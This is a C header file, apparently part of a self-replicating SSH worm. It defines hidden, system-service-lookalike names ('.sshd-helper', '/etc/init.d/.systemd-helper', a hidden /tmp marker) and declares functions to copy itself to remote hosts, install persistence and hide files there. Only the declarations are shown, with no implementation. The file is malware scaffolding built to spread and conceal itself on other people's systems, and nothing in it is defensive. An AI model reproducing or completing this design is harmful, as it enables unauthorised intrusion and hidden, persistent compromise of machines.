#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include "ssh_utils.h"

#define REPLICA_NAME ".sshd-helper"
#define PERSISTENCE_SCRIPT "/etc/init.d/.systemd-helper"
#define MARKER_FILE "/tmp/.ssh-helper-running"

int is_already_running(const char *marker_file);
void copy_self_to_remote(ssh_session session, const char *remote_path);
void setup_persistence(ssh_session session, const char *binary_path);
void hide_file_on_remote(ssh_session session, const char *remote_path);

#endif // PERSISTENCE_H
